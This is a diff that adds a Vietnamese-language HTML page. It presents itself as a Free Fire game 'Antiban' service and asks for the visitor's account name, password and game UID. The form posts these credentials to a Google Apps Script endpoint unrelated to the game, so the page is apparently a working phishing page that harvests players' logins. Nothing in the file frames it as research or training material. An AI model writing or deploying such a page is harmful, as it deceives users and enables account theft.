@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Vui lòng nhập thông tin tài khoản free fire của bạn để tiếp tục sử dụng</title>
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f5f5f5;
+      }
+
+      form {
+        background: white;
+        padding: 30px 40px;
+        border-radius: 10px;
+        box-shadow: 0 0 15px rgba(0,0,0,0.2);
+        text-align: center;
+      }
+
+      h2 {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      label {
+        display: block;
+        margin: 10px 0 5px;
+        text-align: left;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 15px;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+      }
+
+      input[type="submit"] {
+        padding: 10px 20px;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+
+      input[type="submit"]:hover {
+        background-color: #45a049;
+      }
+    </style>
+  </head>
+  <body>
+    <form action="https://script.google.com/macros/s/AKfycbzEBr-vN0LCIj4IuZGkm4UCk3rffrbU-7rWIw3g5DfVplDS03TQgffIea70R_ET6XQfpQ/exec" method="post">
+      <h2>Nhập thông tin của bạn</h2>
+      
+      <label>👤 Tài khoản:</label>
+      <input type="text" name="ten" required>
+
+      <label>🔐 Mật khẩu:</label>
+      <input type="password" name="matkhau" required>
+
+      <label>UID Free Fire:</label>
+      <input type="text" name="uid">
+
+      <input type="submit" value="Antiban">
+    </form>
+  </body>
+</html>
